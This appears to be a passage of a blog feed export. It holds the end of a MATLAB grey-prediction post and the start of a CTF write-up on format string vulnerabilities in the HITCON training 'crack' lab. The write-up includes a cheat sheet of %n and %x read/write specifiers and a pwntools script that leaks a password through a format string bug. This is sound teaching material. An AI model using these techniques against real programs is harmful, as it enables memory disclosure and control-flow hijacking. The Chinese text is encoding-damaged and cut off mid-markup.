 <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT1<span class="token operator">=</span>B1<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token number">-1</span>    <span class="token function">YN1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN1<span class="token operator">=</span>YN1<span class="token operator">'</span><span class="token punctuation">;</span>A1<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT1<span class="token operator">*</span>B1<span class="token punctuation">)</span><span class="token operator">*</span>BT1<span class="token operator">*</span>YN1<span class="token punctuation">;</span>a1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u1<span class="token operator">=</span><span class="token function">A1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t1<span class="token operator">=</span>u1<span class="token operator">/</span>a1<span class="token punctuation">;</span>t_test1<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%éœ€è¦é¢„æµ‹ä¸ªæ•°</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test1<span class="token operator">+</span>n1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t1<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a1<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t1<span class="token punctuation">;</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n1<span class="token operator">+</span>t_test1<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys1</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x21<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token punctuation">;</span>xs1<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">;</span>yn1<span class="token operator">=</span><span class="token function">ys1</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">;</span>det1<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    det1<span class="token operator">=</span>det1<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det1<span class="token operator">=</span>det1<span class="token operator">/</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs1<span class="token punctuation">,</span>yn1<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'å•è°ƒé€’å¢'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'å®æµ‹å€¼'</span><span class="token punctuation">,</span><span class="token string">'é¢„æµ‹å€¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ç™¾åˆ†ç»å¯¹è¯¯å·®ä¸ºï¼š'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'é¢„æµ‹å€¼ä¸ºï¼š '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys1</span><span class="token punctuation">(</span>n1<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n1<span class="token operator">+</span>t_test1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%æ•´ä¸ªåŒºé—´</span>y2<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x2<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n2<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y2<span class="token punctuation">)</span><span class="token punctuation">;</span>yy2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    <span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B2<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT2<span class="token operator">=</span>B2<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token number">-1</span>    <span class="token function">YN2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN2<span class="token operator">=</span>YN2<span class="token operator">'</span><span class="token punctuation">;</span>A2<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT2<span class="token operator">*</span>B2<span class="token punctuation">)</span><span class="token operator">*</span>BT2<span class="token operator">*</span>YN2<span class="token punctuation">;</span>a2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u2<span class="token operator">=</span><span class="token function">A2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t2<span class="token operator">=</span>u2<span class="token operator">/</span>a2<span class="token punctuation">;</span>t_test2<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%éœ€è¦é¢„æµ‹ä¸ªæ•°</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test2<span class="token operator">+</span>n2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t2<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a2<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t2<span class="token punctuation">;</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n2<span class="token operator">+</span>t_test2<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys2</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x22<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token punctuation">;</span>xs2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">;</span>yn2<span class="token operator">=</span><span class="token function">ys2</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">;</span>det2<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n2    det2<span class="token operator">=</span>det2<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y2</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det2<span class="token operator">=</span>det2<span class="token operator">/</span><span class="token punctuation">(</span>n2<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs2<span class="token punctuation">,</span>yn2<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'å…¨åŒºé—´'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'å®æµ‹å€¼'</span><span class="token punctuation">,</span><span class="token string">'é¢„æµ‹å€¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ç™¾åˆ†ç»å¯¹è¯¯å·®ä¸ºï¼š'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'é¢„æµ‹å€¼ä¸ºï¼š '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys2</span><span class="token punctuation">(</span>n2<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n2<span class="token operator">+</span>t_test2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>åŸè¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e4f895b1.png" alt=""></p><p>å°†å‡½æ•°æ”¹ä¸º y = sin(x) åå‘ç°é¢„æµ‹æ•ˆæœä¸å¤§ï¼Œè¿™æ˜¯å› ä¸ºç°è‰²é¢„æµ‹æ¯”è¾ƒé€‚ç”¨äºå•è°ƒå‡½æ•°è€Œéæ³¢åŠ¨æ€§æ¯”è¾ƒå¤§çš„å‡½æ•°ï¼Œå› ä¸ºè¿™ç§æ³¢åŠ¨ä¼šè¢«è§†ä¸ºå¹²æ‰°æ¶ˆé™¤ã€‚</p><p><img src="https://i.loli.net/2018/11/02/5bdb9e005249b.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> ç®—æ³• </tag>
            
            <tag> æ•°å­¦æ¨¡å‹ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10æœˆ26-Hitcon-å››</title>
      <link href="/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/"/>
      <url>/2018/10/26/Pwn-10%E6%9C%8826-Hitcon-%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="Pwn-10æœˆ26-Hitcon-å››"><a href="#Pwn-10æœˆ26-Hitcon-å››" class="headerlink" title="Pwn-10æœˆ26-Hitcon-å››"></a>Pwn-10æœˆ26-Hitcon-å››</h1><blockquote><p>ç»ƒä¹ Hitconçš„ç¬¬å››å¤©ğŸ·ï¼Œæ„‰å¿«åœ°å­¦ä¹ fsbï¼ˆFormat string bugï¼‰ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p></blockquote><h2 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h2><blockquote><p>å¥½ğŸ‘ï¼Œè¿™é¢˜å¼€å§‹æ¥è§¦æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p>ä»€ä¹ˆæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Ÿæˆ‘ä»¬çŸ¥é“c/c++ä¸­<code>printf</code>å‡½æ•°è¾“å‡ºå€¼éœ€è¦å¯¹åº”çš„å‚æ•°ï¼Œä½†å½“æä¾›çš„å‚æ•°å‡ºç°é—®é¢˜ï¼Œæˆ–è€…æ²¡æœ‰æä¾›å‚æ•°çš„æ—¶å€™ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°±å¯èƒ½å‡ºç°äº†ã€‚<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/#_6" target="_blank" rel="noopener">CTF-wikiä¼ é€é—¨</a></p><p>é‚£ä¹ˆå‡è®¾ï¼Œæ­¤æ—¶æˆ‘ä»¬åœ¨ç¼–å†™ç¨‹åºæ—¶å€™ï¼Œå†™æˆäº†ä¸‹é¢çš„æ ·å­</p><pre><code>printf(&quot;Color %s, Number %d, Float %4.2f&quot;);</code></pre><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬å¹¶æ²¡æœ‰æä¾›å‚æ•°ï¼Œé‚£ä¹ˆç¨‹åºä¼šå¦‚ä½•è¿è¡Œå‘¢ï¼Ÿç¨‹åºç…§æ ·ä¼šè¿è¡Œï¼Œä¼šå°†æ ˆä¸Šå­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ä¸Šé¢çš„ä¸‰ä¸ªå˜é‡åˆ†åˆ«è§£æä¸º</p><ol><li><strong>è§£æå…¶åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸²</strong></li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æ•´å½¢å€¼</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æµ®ç‚¹å€¼</li></ol><p>ç”±æ­¤å¯è§<a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</a>ä¸»è¦æ˜¯ï¼š</p><ul><li><p><strong>1.æ³„æ¼ä»»æ„åœ°å€çš„å€¼ï¼Œleakå†…å­˜ï¼ˆæ¯”å¦‚leakå‡ºlibcåŸºåœ°å€ï¼‰</strong></p></li><li><p><strong>2.å†™ä»»æ„åœ°å€ï¼Œå¯ç”¨äºä¿®æ”¹gotè¡¨</strong></p></li></ul></blockquote><pre class=" language-bash"><code class="language-bash">è¿™éƒ¨åˆ†æ¥è‡ªicemakrçš„åšå®¢ <span class="token operator">==</span><span class="token operator">></span>å‘å¤§ä½¬è‡´æ•¬32ä½è¯»<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // è¯»4ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // åŒä¸Šé¢<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>å†™<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // è§£å¼•ç”¨ï¼Œå†™å…¥å››ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // è§£å¼•ç”¨ï¼Œå†™å…¥ä¸¤ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // è§£å¼•ç”¨ï¼Œå†™å…¥ä¸€ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // è§£å¼•ç”¨ï¼Œå†™å…¥å…«ä¸ªå­—èŠ‚64ä½è¯»<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>      // è¯»4ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$lx</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>     // è¯»8ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // è¯»8ä¸ªå­—èŠ‚<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>å†™<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // è§£å¼•ç”¨ï¼Œå†™å…¥å››ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // è§£å¼•ç”¨ï¼Œå†™å…¥ä¸¤ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // è§£å¼•ç”¨ï¼Œå†™å…¥ä¸€ä¸ªå­—èŠ‚<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // è§£å¼•ç”¨ï¼Œå†™å…¥å…«ä¸ªå­—èŠ‚%1<span class="token variable">$lx</span><span class="token keyword">:</span> RSI%2<span class="token variable">$lx</span><span class="token keyword">:</span> RDX%3<span class="token variable">$lx</span><span class="token keyword">:</span> RCX%4<span class="token variable">$lx</span><span class="token keyword">:</span> R8%5<span class="token variable">$lx</span><span class="token keyword">:</span> R9%6<span class="token variable">$lx</span><span class="token keyword">:</span> æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªQWORD</code></pre><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>æŒ‰å¥—è·¯æ¥ï¼Œå…ˆ<code>checksec crack</code>:</p><p><img src="https://i.loli.net/2018/10/26/5bd2aa6e80564.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å¼€å¯äº†æ ˆæº¢å‡ºä¿æŠ¤(canary found)ï¼Œä»¥åŠæ ˆä¸å¯æ‰§è¡Œ(NX)æªæ–½ï¼Œå¾ˆæ˜æ˜¾è®©æˆ‘ä»¬ä»åˆ«å¤„å…¥æ‰‹ã€‚</p><p>ç®€å•è¿è¡Œä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2aacec0ef5.png" alt=""></p><p>æˆ‘ä»¬éœ€è¦è¾“å…¥ä¸¤ä¸ªå€¼ï¼Œä¸€ä¸ªæ˜¯nameï¼Œè¾“å…¥ä¹‹åä¼šè¢«æ‰“å°ï¼Œä¸€ä¸ªæ˜¯passwordã€‚</p><p><a href="http://m4x.fun/post/hitcon-training-writeup/#lab7-crack" target="_blank" rel="noopener">m4xå¸ˆå‚…</a>çš„é€»è¾‘ï¼š<code>è¾“å‡º name æ—¶æœ‰æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè¿™ä¸ªé¢˜çš„æ€è·¯æœ‰å¾ˆå¤šï¼Œå¯ä»¥åˆ©ç”¨ fsb æ”¹å†™ passwordï¼Œæˆ–è€… leak å‡º passwordï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ fsbï¼Œhijack puts_got åˆ° system(â€œcat flagâ€) å¤„ï¼ˆæ³¨æ„è¿™é‡Œ printf å®é™…è°ƒç”¨äº† putsï¼‰</code>ã€‚</p></blockquote><h3 id="é€»è¾‘åˆ†æ"><a href="#é€»è¾‘åˆ†æ" class="headerlink" title="é€»è¾‘åˆ†æ"></a>é€»è¾‘åˆ†æ</h3><blockquote><p>idaproå¯åŠ¨ï¼ï¼å¯åŠ¨ï¼ï¼ç»™æˆ‘å¯åŠ¨å•Šï¼ï¼ğŸ™ƒï¼mainå‡½æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2ac48e9124.png" alt=""></p></blockquote><h4 id="exp1ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²password"><a href="#exp1ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²password" class="headerlink" title="exp1ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²password"></a>exp1ï¼šé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„éœ²password</h4><blockquote><p><img src="https://i.loli.net/2018/10/26/5bd2b96d60a25.png" alt=""></p><p>ç®€å•æµ‹è¯•ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ï¼Œè¿™äº›åº”è¯¥æ˜¯<code>printf</code>æ ˆä¸­çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾åˆ°æ ˆä¸­å­˜å‚¨æˆ‘ä»¬è¾“å…¥çš„å†…å®¹çš„ä½ç½®ï¼Œå‡å¦‚è¾“å…¥çš„æ˜¯æŸåœ°å€ï¼Œå†ç”¨%sè§£æå°±å¯è·å¾—è¯¥åœ°å€ä¸‹çš„å†…å®¹ï¼š</p><p><img src="https://i.loli.net/2018/10/26/5bd2bb34567e1.png" alt=""></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/26/5bd2c986ab76f.png" class="lazyload"></p><p>å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å†…å®¹åœ¨æ ˆä¸­çš„ç¬¬åä¸ªä½ç½®ï¼Œè‡³äºä¸ºä»€ä¹ˆåœ¨gdbçœ‹æ ˆä¸­æ•°æ®åœ¨ç¬¬åä¸€ä¸ªä½ç½®ï¼Œæ˜¯å› ä¸ºâ€Hello ,â€è¿˜æ²¡æœ‰è¢«è¾“å‡ºï¼Œå¾…å…¶è¾“å‡ºåæˆ‘ä»¬çš„è¾“å…¥å°±æ¥åˆ°äº†ç¬¬åä¸ªä½ç½®ã€‚</p><p>è¿™é‡Œå­¦åˆ°ä¸€ä¸ªå°çŸ¥è¯†ï¼Œ<code>%10$s</code>ä¸­æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„â€œ$â€æ“ä½œç¬¦ï¼Œå…¶å…è®¸æˆ‘ä»¬ä»æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­é€‰å–ä¸€ä¸ªä½ç½®çš„å‚æ•°ä½œä¸ºç‰¹å®šçš„å‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥ä»IDAä¸­å¾—åˆ°<code>password_addr=0x804A080</code>ï¼Œç„¶åæ„é€ EXPã€‚</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2scontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>pwd_addr<span class="token operator">=</span> <span class="token number">0x804A048</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' ?'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwd_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|%10$x||"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#drop = True è¡¨ç¤ºä¸¢å¼ƒpatternï¼Œä¸æ¥å—pattern</span>pwd <span class="token operator">=</span> str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">,</span>drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="/images/placeholder.png" alt="" 